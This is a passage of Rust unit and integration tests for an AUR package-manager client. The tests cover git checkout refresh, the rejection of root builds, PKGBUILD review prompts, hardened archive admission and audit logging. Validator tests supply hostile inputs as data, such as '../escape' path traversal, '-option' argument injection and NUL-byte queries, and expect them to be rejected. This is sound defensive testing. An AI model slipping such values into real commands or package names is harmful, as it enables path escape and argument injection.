    async fn refresh_checkout_from_fetches_new_origin_commit() {
        let temp = tempfile::tempdir().unwrap();
        let remote = temp.path().join("remote.git");
        let seed = temp.path().join("seed");
        let checkout = temp.path().join("pkg");

        let git = |args: &[&std::ffi::OsStr]| {
            std::process::Command::new("git")
                .args(args)
                .output()
                .unwrap()
        };
        assert!(
            git(&["init".as_ref(), "--bare".as_ref(), remote.as_os_str()])
                .status
                .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                remote.as_os_str(),
                "config".as_ref(),
                "uploadpack.allowFilter".as_ref(),
                "true".as_ref(),
            ])
            .status
            .success()
        );
        assert!(git(&["init".as_ref(), seed.as_os_str()]).status.success());
        for (key, value) in [
            ("user.email", "test@example.invalid"),
            ("user.name", "OMG test"),
            ("commit.gpgsign", "false"),
        ] {
            assert!(
                git(&[
                    "-C".as_ref(),
                    seed.as_os_str(),
                    "config".as_ref(),
                    key.as_ref(),
                    value.as_ref(),
                ])
                .status
                .success()
            );
        }
        std::fs::write(seed.join("PKGBUILD"), "pkgver=1\n").unwrap();
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "add".as_ref(),
                "PKGBUILD".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "commit".as_ref(),
                "-m".as_ref(),
                "initial".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "remote".as_ref(),
                "add".as_ref(),
                "origin".as_ref(),
                remote.as_os_str(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "push".as_ref(),
                "-u".as_ref(),
                "origin".as_ref(),
                "HEAD".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&["clone".as_ref(), remote.as_os_str(), checkout.as_os_str()])
                .status
                .success()
        );
        std::fs::write(seed.join("new-file"), "from-origin\n").unwrap();
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "add".as_ref(),
                "new-file".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "commit".as_ref(),
                "-m".as_ref(),
                "add-file".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "push".as_ref(),
                "origin".as_ref(),
                "HEAD".as_ref(),
            ])
            .status
            .success()
        );
        assert!(!checkout.join("new-file").exists());
        let client = AurClient {
            build_dir: temp.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        client
            .refresh_checkout_from(&checkout, remote.to_str().unwrap())
            .await
            .unwrap();
        assert_eq!(
            std::fs::read_to_string(checkout.join("new-file")).unwrap(),
            "from-origin\n"
        );
    }

    #[test]
    fn aur_builds_reject_root_and_accept_an_unprivileged_user() {
        require_unprivileged_builder("example", false).expect("regular user");
        let error = require_unprivileged_builder("example", true)
            .expect_err("root builds must be rejected");
        assert!(error.to_string().contains("must not be built as root"));
        assert!(error.to_string().contains("omg install example"));
    }

    #[test]
    fn resolved_package_base_rejects_untrusted_path_and_option_syntax() {
        assert_eq!(
            AurClient::validated_package_base("output", Some("valid-base")).unwrap(),
            "valid-base"
        );
        assert!(AurClient::validated_package_base("output", Some("../escape")).is_err());
        assert!(AurClient::validated_package_base("output", Some("-option")).is_err());
    }

    #[test]
    fn index_entry_names_are_validated_against_expected_packages() {
        validate_index_entry_name("valid-package", None).expect("valid index package");
        assert!(validate_index_entry_name("../escape", None).is_err());
        let error = validate_index_entry_name("different", Some("expected"))
            .expect_err("an exact lookup must reject a different package");
        assert!(error.to_string().contains("unexpected package 'different'"));
    }

    #[test]
    fn search_query_validation_is_shared_by_all_aur_search_paths() {
        assert!(validate_search_query("normal package").is_ok());
        assert!(validate_search_query(&"x".repeat(AUR_SEARCH_MAX_BYTES)).is_ok());
        assert!(validate_search_query(&"x".repeat(AUR_SEARCH_MAX_BYTES + 1)).is_err());
        assert!(validate_search_query("").is_err());
        assert!(validate_search_query("   ").is_err());
        assert!(validate_search_query("x").is_err());
        assert!(validate_search_query("package\nname").is_err());
        assert!(validate_search_query("package\0name").is_err());
    }

    #[test]
    fn test_dependency_name_parses_constraints() {
        assert_eq!(dependency_name("simdutf-git"), "simdutf-git");
        assert_eq!(dependency_name("fast_float>=7.0"), "fast_float");
        assert_eq!(dependency_name("foo<2.0"), "foo");
        assert_eq!(dependency_name("bar=1.2.3"), "bar");
    }

    fn paired_fixture(name: &str, digest: &str) -> artifact_inspector::ArtifactInspection {
        artifact_inspector::ArtifactInspection {
            policy_version: artifact_inspector::INSPECTION_POLICY_VERSION,
            archive_sha256: digest.to_owned(),
            package_name: name.to_owned(),
            package_version: "1.0-1".to_owned(),
            package_base: "demo".to_owned(),
            architecture: "x86_64".to_owned(),
            member_count: 4,
            executable_files: Vec::new(),
            privileged_files: Vec::new(),
            install_hook: None,
            paired_build_reasons: vec!["system-configuration".to_owned()],
        }
    }

    #[test]
    #[ignore = "requires native Arch build tools and explicitly isolated fixture state"]
    fn native_isolated_fixture_builds_reviewed_source_without_installing() -> Result<()> {
        use std::collections::HashMap;

        use super::super::parallel_build::ParallelBuilder;

        anyhow::ensure!(
            matches!(
                std::env::var("OMG_AUR_NATIVE_FIXTURE").as_deref(),
                Ok("isolated-container" | "private-build")
            ),
            "native fixture requires explicitly isolated build state"
        );
        for variable in ["OMG_CACHE_DIR", "OMG_DATA_DIR", "OMG_CONFIG_DIR"] {
            anyhow::ensure!(
                std::env::var_os(variable).is_some_and(|path| Path::new(&path).is_absolute()),
                "native fixture requires an absolute private {variable}"
            );
        }
        anyhow::ensure!(
            !crate::core::is_root(),
            "native fixture must run unprivileged"
        );
        let cache = paths::cache_dir();
        std::fs::create_dir_all(&cache)?;
        let directory = tempfile::tempdir_in(&cache)?;
        let socket = directory.path().join("absent.sock");
        temp_env::with_vars(
            [
                ("CARGO_PRIMARY_PACKAGE", Some(std::ffi::OsStr::new("1"))),
                ("OMG_SOCKET_PATH", Some(socket.as_os_str())),
            ],
            || {
                tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()?
                    .block_on(async {
                        let build_dir = directory.path().join("aur");
                        let checkout = build_dir.join("omg-coverage-fixture");
                        std::fs::create_dir_all(&checkout)?;
                        std::fs::write(
                            checkout.join("PKGBUILD"),
                            "pkgname=omg-coverage-fixture\npkgver=1\npkgrel=1\npkgdesc='Inert OMG coverage fixture'\narch=('any')\nlicense=('MIT')\npackage() { install -Dm644 /dev/null \"$pkgdir/usr/share/omg-coverage-fixture/empty\"; }\n",
                        ).expect("write fixture file");
                        std::fs::write(
                            checkout.join(".SRCINFO"),
                            "pkgbase = omg-coverage-fixture\n\tpkgdesc = Inert OMG coverage fixture\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = any\n\tlicense = MIT\n\npkgname = omg-coverage-fixture\n",
                        ).expect("write fixture file");
                        let outputs = vec!["omg-coverage-fixture".to_owned()];
                        let source = ReviewedSource::capture(&checkout)?;
                        let dependencies = check_dependencies_from_metadata(source.required_srcinfo("fixture")?.as_ref(), &outputs)?;
                        anyhow::ensure!(
                            dependencies.missing.is_empty() && dependencies.package_outputs == outputs,
                            "fixture must never require dependency installation"
                        );
                        let mut settings = Settings::default();
                        settings.aur.security_profile = crate::config::AurSecurityProfile::Hardened;
                        let client = AurClient {
                            build_dir,
                            settings,
                            package_base_locks: Arc::new(dashmap::DashMap::new()),
                        };
                        let mut hashes = Vec::new();
                        for _ in 0..2 {
                            let authorized = AuthorizedBuild {
                                lifecycle_guard: client.acquire_build_lifecycle().await?,
                                package: "omg-coverage-fixture".to_owned(),
                                requested_outputs: outputs.clone(),
                                reviewed_digest: ReviewedSource::capture(&checkout)?,
                            };
                            let result = client
                                .install_authorized_package_outputs(authorized, None)
                                .await;
                            let log_path = client.build_log_path("omg-coverage-fixture");
                            let log = std::fs::read_to_string(&log_path);
                            let diagnostic = format!(
                                "Native fixture build log ({}):\n{log:?}",
                                log_path.display()
                            );
                            let archives = result.context(diagnostic)?;
                            assert_eq!(archives.len(), 1);
                            let inspected = artifact_inspector::inspect_archive(&archives.archives[0].path())?.into_inspection();
                            assert_eq!(inspected.package_name, "omg-coverage-fixture");
                            assert!(inspected.install_hook.is_none());
                            hashes.push(inspected.archive_sha256);
                        }
                        assert_eq!(
                            hashes[0], hashes[1],
                            "repeated admission preserves archive identity"
                        );
                        std::fs::write(
                            checkout.join("PKGBUILD"),
                            "pkgname=omg-coverage-fixture\npkgver=1\npkgrel=1\narch=('any')\npackage() { printf 'intentional-fixture-failure\\n' >&2; return 1; }\n",
                        ).expect("write fixture file");
                        let authorized = AuthorizedBuild {
                            lifecycle_guard: client.acquire_build_lifecycle().await?,
                            package: "omg-coverage-fixture".to_owned(),
                            requested_outputs: outputs,
                            reviewed_digest: ReviewedSource::capture(&checkout)?,
                        };
                        let error = client
                            .install_authorized_package_outputs(authorized, None)
                            .await
                            .expect_err("a failed recipe must not reuse previously accepted archives");
                        let diagnostic = format!("{error:#}");
                        let error_kind = error.downcast_ref::<AurError>();
                        let build_failed = matches!(error_kind, Some(AurError::BuildFailed { .. }));
                        assert!(build_failed, "{diagnostic}");
                        let log = std::fs::read_to_string(client.build_log_path("omg-coverage-fixture"))?;
                        assert!(log.contains("intentional-fixture-failure"), "{log}");

                        let success = "omg-coverage-wave-fixture";
                        let failure = "omg-coverage-fixture";
                        let success_checkout = client.build_dir.join(success);
                        std::fs::create_dir_all(&success_checkout)?;
                        std::fs::write(
                            success_checkout.join("PKGBUILD"),
                            "pkgname=omg-coverage-wave-fixture\npkgver=1\npkgrel=1\npkgdesc='Inert OMG parallel wave fixture'\narch=('any')\nlicense=('MIT')\npackage() { install -Dm644 /dev/null \"$pkgdir/usr/share/omg-coverage-wave-fixture/empty\"; printf 'wave-success-complete\\n' >&2; }\n",
                        )?;
                        std::fs::write(
                            success_checkout.join(".SRCINFO"),
                            "pkgbase = omg-coverage-wave-fixture\n\tpkgdesc = Inert OMG parallel wave fixture\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = any\n\tlicense = MIT\n\npkgname = omg-coverage-wave-fixture\n",
                        )?;
                        let client = Arc::new(client);
                        let builder = ParallelBuilder::new(Arc::clone(&client), 2);
                        let empty = builder
                            .build_level(1, 1, &[], &HashMap::new(), &mut HashMap::new())
                            .await?;
                        assert_eq!(empty.succeeded_output_count(), 0);
                        assert_eq!(empty.failed_output_count(), 0);
                        assert_eq!(empty.skipped_output_count(), 0);
                        assert!(empty.failures().next().is_none());
                        assert!(empty.skipped_outputs().is_empty());

                        let packages = vec![failure.to_owned(), success.to_owned()];
                        let mut jobs = HashMap::new();
                        let mut authorizations = HashMap::new();
                        let success_source = ReviewedSource::capture(&success_checkout)?.digest;
                        for package in &packages {
                            let checkout = client.build_dir.join(package);
                            let outputs = vec![package.clone()];
                            let source = ReviewedSource::capture(&checkout)?;
                            let dependencies = check_dependencies_from_metadata(source.required_srcinfo("fixture")?.as_ref(), &outputs)?;
                            anyhow::ensure!(
                                dependencies.missing.is_empty() && dependencies.package_outputs == outputs,
                                "parallel fixture must never require dependency installation"
                            );
                            jobs.insert(package.clone(), BuildJob::new(package.clone(), Vec::new()));
                            authorizations.insert(
                                package.clone(),
                                AuthorizedBuild {
                                    lifecycle_guard: client.acquire_build_lifecycle().await?,
                                    package: package.clone(),
                                    requested_outputs: outputs,
                                    reviewed_digest: ReviewedSource::capture(&checkout)?,
                                },
                            );
                        }
                        std::fs::remove_file(client.build_log_path(failure))?;
                        let audit_path = paths::data_dir().join("audit/audit.jsonl");
                        let before = std::fs::read_to_string(&audit_path)?;
                        let error = builder
                            .build_level(1, 1, &packages, &jobs, &mut authorizations)
                            .await
                            .expect_err("a collected native archive must reach inert installation refusal");
                        assert!(authorizations.is_empty(), "both native jobs must be consumed");
                        assert!(
                            error.chain().any(|cause| {
                                cause.to_string().lines().next()
                                    == Some("Privilege elevation not supported in development mode.")
                            }),
                            "{error:#}"
                        );
                        let success_log = std::fs::read_to_string(client.build_log_path(success))?;
                        assert!(success_log.contains("wave-success-complete"), "{success_log}");
                        let failure_log = std::fs::read_to_string(client.build_log_path(failure))?;
                        assert!(
                            failure_log.contains("intentional-fixture-failure"),
                            "{failure_log}"
                        );
                        let after = std::fs::read_to_string(audit_path)?;
                        let entries = after
                            .strip_prefix(&before)
                            .context("native fixture audit must retain the pre-wave prefix")?
                            .lines()
                            .map(serde_json::from_str::<crate::core::security::audit::AuditEntry>)
                            .collect::<std::result::Result<Vec<_>, _>>()?;
                        assert_eq!(
                            entries.iter().filter(|entry| {
                                entry.description.starts_with("Package operation aur_inspection: succeeded;")
                                    && entry.resource.contains(&format!("source_manifest_sha256={success_source}"))
                                    && entry.resource.contains(&format!("{success} 1-1 archive_sha256="))
                            }).count(),
                            2,
                            "both native archives must be inspected for the new wave source: {entries:?}"
                        );
                        assert!(
                            entries.iter().any(|entry| {
                                entry.description.starts_with("Package operation aur_paired_build: succeeded;")
                                    && entry.resource.contains(&format!("source_manifest_sha256={success_source}"))
                                    && entry.resource.contains(&format!("outputs={success}"))
                                    && entry.resource.contains("result=exact-match")
                            }),
                            "successful wave fixture must complete independent exact-match verification: {entries:?}"
                        );
                        Ok(())
                    })
            },
        )
    }

    #[test]
    #[ignore = "requires the disposable, network-isolated Arch coverage container"]
    fn native_isolated_history_requires_hardened_review() -> Result<()> {
        anyhow::ensure!(
            std::env::var("OMG_AUR_NATIVE_FIXTURE").as_deref() == Ok("isolated-container")
                && !crate::core::is_root(),
            "history fixture requires the unprivileged isolated container"
        );
        let output = std::process::Command::new(std::env::current_exe()?)
            .args([
                "--exact",
                "package_managers::aur::client::tests::attended_review_requires_hardened_confirmation_even_with_yes",
                "--nocapture",
            ])
            .env("OMG_AUR_HISTORY_FIXTURE", "1")
            .output()?;
        let diagnostic = format!(
            "history fixture failed:\n{}\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
        anyhow::ensure!(output.status.success(), "{diagnostic}");
        Ok(())
    }

    #[tokio::test]
    async fn attended_review_requires_hardened_confirmation_even_with_yes() -> Result<()> {
        if Settings::rerun_test_unprivileged(
            "package_managers::aur::client::tests::attended_review_requires_hardened_confirmation_even_with_yes",
        ) {
            return Ok(());
        }
        const MODE: &str = "OMG_AUR_REVIEW_PTY_MODE";
        if let Ok(mode) = std::env::var(MODE) {
            let history = matches!(mode.as_str(), "history" | "history-accept-failing-build");
            let directory = if history {
                anyhow::ensure!(
                    std::env::var("OMG_AUR_NATIVE_FIXTURE").as_deref() == Ok("isolated-container"),
                    "historical fixture requires the isolated container"
                );
                anyhow::ensure!(
                    std::env::var_os("OMG_CACHE_DIR")
                        .is_some_and(|path| Path::new(&path).is_absolute()),
                    "historical fixture requires an absolute private cache"
                );
                let cache = paths::cache_dir();
                std::fs::create_dir_all(&cache).expect("create private fixture cache");
                tempfile::tempdir_in(cache)?
            } else {
                tempfile::tempdir()?
            };
            let pkgbuild = directory.path().join("PKGBUILD");
            std::fs::write(&pkgbuild, "pkgname=demo\n").expect("write fixture file");
            std::fs::write(directory.path().join(".SRCINFO"), "pkgbase = demo\n")
                .expect("write fixture file");
            crate::core::privilege::set_yes_flag(true);
            let profile = match mode.as_str() {
                "standard" | "authorize" => crate::config::AurSecurityProfile::Standard,
                _ => crate::config::AurSecurityProfile::Hardened,
            };
            if history {
                let mut settings = Settings::default();
                settings.aur.security_profile = profile;
                let client = AurClient {
                    build_dir: directory.path().join("build"),
                    settings,
                    package_base_locks: Arc::new(dashmap::DashMap::new()),
                };
                let error = client
                    .downgrade_from_history("demo", "1-1")
                    .await
                    .expect_err("historical fixture must not install a package");
                if mode == "history" {
                    assert!(
                        error.to_string().contains("Build aborted by user"),
                        "{error:#}"
                    );
                    println!("REVIEW_DECLINED");
                } else {
                    assert!(
                        error
                            .to_string()
                            .contains("Historical build of demo 1-1 failed"),
                        "{error:#}"
                    );
                    let log = std::fs::read_to_string(client.build_log_path("demo"))?;
                    assert!(log.contains("intentional-history-fixture-failure"), "{log}");
                    println!("HISTORY_BUILD_FAILED");
                }
            } else if mode == "authorize" {
                let client = AurClient {
                    build_dir: directory.path().join("build"),
                    settings: Settings::default(),
                    package_base_locks: Arc::new(dashmap::DashMap::new()),
                };
                let authorized = client
                    .authorize_package_outputs("demo", &["demo".to_owned()])
                    .await?;
                authorized
                    .reviewed_digest
                    .verify(&client.build_dir.join("demo"))?;
                println!("REVIEW_ACCEPTED");
            } else {
                let result = AurClient::review_pkgbuild("demo", &pkgbuild, profile).await;
                if mode == "standard" {
                    result?.verify(directory.path())?;
                    println!("REVIEW_ACCEPTED");
                } else {
                    let error = result.expect_err("declining hardened review must abort");
                    assert!(
                        error.to_string().contains("Build aborted by user"),
                        "{error:#}"
                    );
                    println!("REVIEW_DECLINED");
                }
            }
            return Ok(());
        }

        // The child owns its terminal and global --yes flag. Input is sent only
        // after the prompt appears, so an unexpected skipped prompt fails.
        let driver = r#"
import errno, os, pty, select, shutil, signal, sys, tempfile, time
mode, executable, test_name = sys.argv[1:]
fixture = tempfile.mkdtemp(prefix='omg-review-pty-')
with open(os.path.join(fixture, 'git'), 'w') as script:
    script.write('''#!/bin/sh
set -eu
if [ "$1" = clone ] && [ "$#" -eq 5 ] && [ "$2" = --filter=blob:none ] && [ "$3" = -- ] && [ "$4" = https://aur.archlinux.org/demo.git ]; then
    case "$5" in */_rollback/demo-*) exit 0;; *) exit 1;; esac
fi
if [ "$#" -ge 4 ] && [ "$1" = -C ]; then
    case "$2" in */_rollback/demo-*) ;; *) exit 1;; esac
    if [ "$#" -eq 4 ] && [ "$3" = log ] && [ "$4" = --format=%H ]; then
        printf 'fixture-commit\\n'
        exit 0
    fi
    if [ "$#" -eq 4 ] && [ "$3" = show ] && [ "$4" = fixture-commit:.SRCINFO ]; then
        printf 'pkgbase = demo\\npkgver = 1\\npkgrel = 1\\narch = any\\npkgname = demo\\n'
        exit 0
    fi
    if [ "$#" -eq 5 ] && [ "$3" = checkout ] && [ "$4" = --detach ] && [ "$5" = fixture-commit ]; then
        printf 'pkgname=demo\\npkgver=1\\npkgrel=1\\narch=(any)\\npackage() { printf "intentional-history-fixture-failure\\\\n" >&2; return 1; }\\n' > "$2/PKGBUILD"
        printf 'pkgbase = demo\\npkgver = 1\\npkgrel = 1\\narch = any\\npkgname = demo\\n' > "$2/.SRCINFO"
        exit 0
    fi
    exit 1
fi
[ "$#" -eq 6 ] && [ "$1" = clone ] && [ "$2" = --depth=1 ] && [ "$3" = --filter=blob:none ] && [ "$4" = -- ] && [ "$5" = https://aur.archlinux.org/demo.git ]
mkdir "$6"
printf 'pkgname=demo\\n' > "$6/PKGBUILD"
printf 'pkgbase = demo\\n' > "$6/.SRCINFO"
''')
os.chmod(os.path.join(fixture, 'git'), 0o700)
pid, fd = pty.fork()
if pid == 0:
    os.environ['OMG_AUR_REVIEW_PTY_MODE'] = mode
    os.environ['PATH'] = fixture + ':/usr/bin:/bin'
    os.execv(executable, [executable, '--exact', test_name, '--nocapture'])
output = bytearray()
sent = False
deadline = time.monotonic() + 45
status = None
try:
    while time.monotonic() < deadline:
        readable, _, _ = select.select([fd], [], [], 0.1)
        if readable:
            try:
                chunk = os.read(fd, 4096)
            except OSError as error:
                if error.errno != errno.EIO:
                    raise
                chunk = b''
            output.extend(chunk)
            if len(output) > 1024 * 1024:
                raise RuntimeError('review output exceeded limit')
            if mode in ('hardened', 'history', 'history-accept-failing-build') and not sent and b'Build demo from this PKGBUILD?' in output:
                os.write(fd, b'y\n' if mode == 'history-accept-failing-build' else b'n\n')
                sent = True
        done, child_status = os.waitpid(pid, os.WNOHANG)
        if done:
            status = child_status
            while True:
                try:
                    chunk = os.read(fd, 4096)
                except OSError as error:
                    if error.errno != errno.EIO:
                        raise
                    break
                if not chunk:
                    break
                output.extend(chunk)
                if len(output) > 1024 * 1024:
                    raise RuntimeError('review output exceeded limit')
            break
    else:
        raise RuntimeError('review child timed out')
    expected = (b'REVIEW_DECLINED' if mode in ('hardened', 'history') else
                b'HISTORY_BUILD_FAILED' if mode == 'history-accept-failing-build' else b'REVIEW_ACCEPTED')
    prompt_required = mode in ('hardened', 'history', 'history-accept-failing-build')
    if (os.waitstatus_to_exitcode(status) != 0 or expected not in output or
            (prompt_required and not sent) or
            (mode == 'history-accept-failing-build' and b'REVIEW_DECLINED' in output)):
        raise RuntimeError('review child failed or did not show the expected prompt')
finally:
    if status is None:
        os.kill(pid, signal.SIGKILL)
        os.waitpid(pid, 0)
    os.close(fd)
    shutil.rmtree(fixture)
    sys.stdout.buffer.write(output)
"#;
        let mut modes = vec!["standard", "hardened", "authorize"];
        if std::env::var("OMG_AUR_HISTORY_FIXTURE").as_deref() == Ok("1") {
            modes.extend(["history", "history-accept-failing-build"]);
        }
        for mode in modes {
            let output = std::process::Command::new("python3")
                .args(["-c", driver, mode])
                .arg(std::env::current_exe()?)
                .arg("package_managers::aur::client::tests::attended_review_requires_hardened_confirmation_even_with_yes")
                .output()?;
            let diagnostic = format!(
                "{mode} review fixture failed:\n{}\n{}",
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)
            );
            assert!(output.status.success(), "{diagnostic}");
        }
        Ok(())
    }

    fn with_private_admission_fixture(
        test: &str,
        body: impl FnOnce(&tokio::runtime::Runtime, &Path) -> Result<()>,
    ) -> Result<()> {
        if Settings::rerun_test_unprivileged(test) || crate::core::testing::run_isolated_test(test)
        {
            return Ok(());
        }
        let fixture = tempfile::tempdir()?;
        let configuration = fixture.path().join("config");
        let data = fixture.path().join("data");
        let cache = fixture.path().join("cache");
        let socket = fixture.path().join("absent.sock");
        for directory in [&configuration, &data, &cache] {
            std::fs::create_dir(directory)?;
        }
        temp_env::with_vars(
            [
                ("OMG_CONFIG_DIR", Some(configuration.as_os_str())),
                ("OMG_DATA_DIR", Some(data.as_os_str())),
                ("OMG_CACHE_DIR", Some(cache.as_os_str())),
                ("OMG_SOCKET_PATH", Some(socket.as_os_str())),
                ("CARGO_PRIMARY_PACKAGE", Some(std::ffi::OsStr::new("1"))),
            ],
            || {
                std::fs::write(
                    configuration.join("config.toml"),
                    "[aur]\nsecurity_profile = 'standard'\n",
                )?;
                let runtime = tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()?;
                body(&runtime, fixture.path())
            },
        )
    }

    #[test]
    fn archive_admission_enforces_profile_and_binds_paired_cache_to_it() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::archive_admission_enforces_profile_and_binds_paired_cache_to_it";
        with_private_admission_fixture(TEST, |runtime, fixture| {
            runtime.block_on(async {
                let checkout = tempfile::tempdir_in(fixture)?;
                std::fs::write(checkout.path().join("PKGBUILD"), "pkgname=demo\n")
                    .expect("write fixture file");
                std::fs::write(
                    checkout.path().join(".SRCINFO"),
                    "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\ninstall = demo.install\npkgname = demo\n",
                )
                .expect("write fixture file");
                let hook = "post_install() { :; }\n";
                std::fs::write(checkout.path().join("demo.install"), hook).expect("write fixture file");
                let source = ReviewedSource::capture(checkout.path())?;
                let archives = tempfile::tempdir_in(fixture)?;
                let archive = archives.path().join("demo-1-1-any.pkg.tar.gz");
                let info = "pkgname = demo\npkgbase = demo\npkgver = 1-1\n";
                write_pkg_archive(&archive, info, Some(hook));
                let invocation = tempfile::tempdir_in(fixture)?;
                let env = MakepkgEnv {
                    pkgdest: invocation.path().join("pkg"),
                    srcdest: invocation.path().join("src"),
                    builddir: invocation.path().join("build"),
                    _invocation: invocation,
                    makeflags: String::new(),
                    compiler_cache_dirs: Vec::new(),
                    extra_env: Vec::new(),
                    pgp_home: None,
                };
                let mut client = AurClient {
                    build_dir: checkout.path().to_path_buf(),
                    settings: Settings::default(),
                    package_base_locks: Arc::new(dashmap::DashMap::new()),
                };
                let inspection = artifact_inspector::inspect_archive(&archive)?.into_inspection();
                let mut old_policy = inspection.clone();
                old_policy.policy_version = 3;
                assert_ne!(
                    client.paired_build_cache_key(&source, &env, std::slice::from_ref(&old_policy)),
                    client.paired_build_cache_key(&source, &env, std::slice::from_ref(&inspection)),
                    "a policy-3 paired-build proof must not authorize the current archive policy"
                );
                let standard_key =
                    client.paired_build_cache_key(&source, &env, std::slice::from_ref(&inspection));
                client.settings.aur.security_profile = crate::config::AurSecurityProfile::Hardened;
                let hardened_key =
                    client.paired_build_cache_key(&source, &env, std::slice::from_ref(&inspection));
                assert_ne!(
                    standard_key, hardened_key,
                    "a proof under one profile must not authorize another"
                );
                let error = client
                    .authorize_with_paired_build(
                        std::slice::from_ref(&archive),
                        &source,
                        "demo",
                        &["demo".to_owned()],
                        &["demo".to_owned()],
                        true,
                        checkout.path(),
                        &env,
                    )
                    .await
                    .expect_err("hardened admission must reject an install hook before rebuilding");
                assert!(
                    error.to_string().contains("Hardened AUR profile rejects"),
                    "{error:#}"
                );
                client.settings.aur.review_pkgbuild = false;
                let error = client
                    .run_build(checkout.path(), &env, "demo", &source)
                    .await
                    .expect_err("an invalid hardened configuration must fail before running a build");
                assert!(
                    error.to_string().contains("requires build_method"),
                    "{error:#}"
                );
                Ok(())
            })
        })
    }

    #[test]
    fn standard_admission_accepts_an_ordinary_archive_without_rebuild() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::standard_admission_accepts_an_ordinary_archive_without_rebuild";
        with_private_admission_fixture(TEST, |runtime, fixture| {
            runtime.block_on(async {
                let checkout = tempfile::tempdir_in(fixture)?;
                std::fs::write(checkout.path().join("PKGBUILD"), "pkgname=demo\n")
                    .expect("write fixture file");
                std::fs::write(
                    checkout.path().join(".SRCINFO"),
                    "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\n",
                )
                .expect("write fixture file");
                let source = ReviewedSource::capture(checkout.path())?;
                let archives = tempfile::tempdir_in(fixture)?;
                let archive = archives.path().join("demo-1-1-any.pkg.tar.gz");
                write_pkg_archive(
                    &archive,
                    "pkgname = demo\npkgbase = demo\npkgver = 1-1\n",
                    None,
                );
                let invocation = tempfile::tempdir_in(fixture)?;
                let env = MakepkgEnv {
                    pkgdest: invocation.path().join("pkg"),
                    srcdest: invocation.path().join("src"),
                    builddir: invocation.path().join("build"),
                    _invocation: invocation,
                    makeflags: String::new(),
                    compiler_cache_dirs: Vec::new(),
                    extra_env: Vec::new(),
                    pgp_home: None,
                };
                let client = AurClient {
                    build_dir: checkout.path().to_path_buf(),
                    settings: Settings::default(),
                    package_base_locks: Arc::new(dashmap::DashMap::new()),
                };
                let accepted = client
                    .authorize_with_paired_build(
                        std::slice::from_ref(&archive),
                        &source,
                        "demo",
                        &["demo".to_owned()],
                        &["demo".to_owned()],
                        true,
                        checkout.path(),
                        &env,
                    )
                    .await?;
                assert_eq!(accepted.len(), 1);
                assert_eq!(
                    artifact_inspector::inspect_archive(&accepted.archives[0].path())?
                        .into_inspection()
                        .package_name,
                    "demo"
                );
                let journal = fixture.join("data/audit/audit.jsonl");
                assert!(
                    journal.is_file(),
                    "inspection audit journal: {}",
                    journal.display()
                );
                let audit = std::fs::read_to_string(&journal)?;
                assert!(audit.contains("aur_inspection"), "{audit}");
                assert!(audit.contains("succeeded"), "{audit}");
                Ok(())
            })
        })
    }

    #[test]
    fn standard_build_is_rejected_after_current_profile_becomes_hardened() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::standard_build_is_rejected_after_current_profile_becomes_hardened";
        with_private_admission_fixture(TEST, |runtime, fixture| {
            runtime.block_on(async {
                let checkout = tempfile::tempdir_in(fixture)?;
                std::fs::write(checkout.path().join("PKGBUILD"), "pkgname=demo\n")
                    .expect("write fixture file");
                std::fs::write(
                    checkout.path().join(".SRCINFO"),
                    "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\n",
                )
                .expect("write fixture file");
                let source = ReviewedSource::capture(checkout.path())?;
                let archives = tempfile::tempdir_in(fixture)?;
                let archive = archives.path().join("demo-1-1-any.pkg.tar.gz");
                write_pkg_archive(
                    &archive,
                    "pkgname = demo\npkgbase = demo\npkgver = 1-1\n",
                    None,
                );
                let invocation = tempfile::tempdir_in(fixture)?;
                let env = MakepkgEnv {
                    pkgdest: invocation.path().join("pkg"),
                    srcdest: invocation.path().join("src"),
                    builddir: invocation.path().join("build"),
                    _invocation: invocation,
                    makeflags: String::new(),
                    compiler_cache_dirs: Vec::new(),
                    extra_env: Vec::new(),
                    pgp_home: None,
                };
                let client = AurClient {
                    build_dir: checkout.path().to_path_buf(),
                    settings: Settings::default(),
                    package_base_locks: Arc::new(dashmap::DashMap::new()),
                };
                let accepted = client
                    .authorize_with_paired_build(
                        std::slice::from_ref(&archive),
                        &source,
                        "demo",
                        &["demo".to_owned()],
                        &["demo".to_owned()],
                        true,
                        checkout.path(),
                        &env,
                    )
                    .await?;
                let journal = fixture.join("data/audit/audit.jsonl");
                assert!(
                    journal.is_file(),
                    "inspection audit journal: {}",
                    journal.display()
                );
                let audit = std::fs::read_to_string(&journal)?;
                assert!(audit.contains("aur_inspection"), "{audit}");
                assert!(audit.contains("succeeded"), "{audit}");
                std::fs::write(
                    fixture.join("config/config.toml"),
                    "[aur]\nsecurity_profile = 'hardened'\n",
                )?;
                let error =
                    AurClient::install_built_packages(std::slice::from_ref(&accepted), None)
                        .await
                        .expect_err(
                            "standard build evidence must not satisfy the newly hardened profile",
                        );
                assert!(
                    error
                        .to_string()
                        .contains("built under the Standard AUR profile"),
                    "{error:#}"
                );
                let wave = [
                    BuiltPackages {
                        archives: vec![ArchiveSnapshot::capture(&archive)?],
